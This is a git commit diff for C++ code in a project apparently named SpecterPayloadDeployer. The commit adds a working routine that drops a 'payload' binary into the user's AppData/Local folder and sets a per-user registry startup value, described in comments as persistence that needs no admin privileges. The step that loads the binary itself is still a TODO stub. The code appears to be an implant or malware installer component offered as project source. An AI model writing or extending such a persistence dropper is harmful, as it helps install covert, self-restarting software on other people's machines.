d065ccf7e7c5dfd72f2fa46b4b114292f0dacfff
Alex Smoliak <alexsmoliak@gmail.com>
2024-01-02 22:07:49 +0200

    Added code to enable and disable persistency, as well as the skeleton code for installation. Disabled WinReg from resharper analysis

--- SpecterPayloadDeployer/SpecterBasicDeployment.cpp
+++ SpecterPayloadDeployer/SpecterBasicDeployment.cpp
@@ -1,37 +1,70 @@
 #include "SpecterBasicDeployment.hpp"
 #include "SpecterLib/SyscallException.h"
 #include "SpecterLib/CommonPaths.h"
+#include "SpecterLib/ResourceUtils.h"
 
 #include "3rdPartyLibs/WinReg/WinReg.hpp"
 
 SpecterBasicDeployment::SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name):
 	m_program_name(std::move(program_name)),
-	m_target_file(CommonPaths::GetLocalPath() / target_file_name)
+	m_target_file(CommonPaths::GetLocalPath() / target_file_name),
+	m_reg_key(HKEY_CURRENT_USER, kTargetRegistry)
 {
 }
 
 bool SpecterBasicDeployment::IsInstalled() const
 {
-	return DoesRegistryEntryExist() && DoesFileExist();
+	return IsPersistent() && IsDeployedOnFilesystem();
 }
 
-bool SpecterBasicDeployment::Install()
+bool SpecterBasicDeployment::IsPersistent() const
 {
-	//const winreg::RegKey key(HKEY_CURRENT_USER, kTargetRegistry);
-
-	return false;
-}
-
-bool SpecterBasicDeployment::DoesRegistryEntryExist() const
-{
-	const winreg::RegKey key(HKEY_CURRENT_USER, kTargetRegistry);
-
-	const auto result = key.TryGetStringValue(m_program_name);
+	const auto result = m_reg_key.TryGetStringValue(m_program_name);
 
 	return result.IsValid() && result.GetValue() == m_target_file;
 }
 
-bool SpecterBasicDeployment::DoesFileExist() const
+bool SpecterBasicDeployment::IsDeployedOnFilesystem() const
 {
 	return exists(m_target_file);
+}
+
+bool SpecterBasicDeployment::Install()
+{
+	try
+	{
+		if (!EnablePersistence())
+		{
+			return false;
+		}
+
+		if (!DeployBinary())
+		{
+			DisablePersistence();
+			return false;
+		}
+
+		return true;
+	}
+	catch (const std::exception&)
+	{
+		return false;
+	}
+}
+
+bool SpecterBasicDeployment::EnablePersistence()
+{
+	const auto result = m_reg_key.TrySetStringValue(m_program_name, m_target_file);
+	return result.IsOk();
+}
+
+bool SpecterBasicDeployment::DeployBinary()
+{
+	//ResourceUtils::ReadRawResource() TODO WIP Dynamically load our binary here
+	return true;
+}
+
+void SpecterBasicDeployment::DisablePersistence()
+{
+	m_reg_key.DeleteValue(m_program_name);
 }
--- SpecterPayloadDeployer/SpecterBasicDeployment.hpp
+++ SpecterPayloadDeployer/SpecterBasicDeployment.hpp
@@ -5,6 +5,8 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
+#include "3rdPartyLibs/WinReg/WinReg.hpp"
+
 // This class is responsible for deploying the Specter binary into the machine without any admin privileges
 // Deploy to the AppData/Local folder, and ensures persistence by using the HKCU persistence method and 
 class SpecterBasicDeployment
@@ -14,6 +16,7 @@ class SpecterBasicDeployment
 
 	std::wstring m_program_name;
 	std::filesystem::path m_target_file;
+	winreg::RegKey m_reg_key;
 
 public:
 	SpecterBasicDeployment(const SpecterBasicDeployment& other) = delete;
@@ -23,12 +26,17 @@ public:
 
 	bool IsInstalled() const;
 
+	// Deploys the payload to the current machine, modifies the registry to ensure startup as user
 	bool Install();
 
 private:
-	bool DoesRegistryEntryExist() const;
+	bool IsPersistent() const;
 
-	bool DoesFileExist() const;
+	bool IsDeployedOnFilesystem() const;
 
-	void DeployBinary();
+	bool DeployBinary();
+
+	bool EnablePersistence();
+
+	void DisablePersistence();
 };
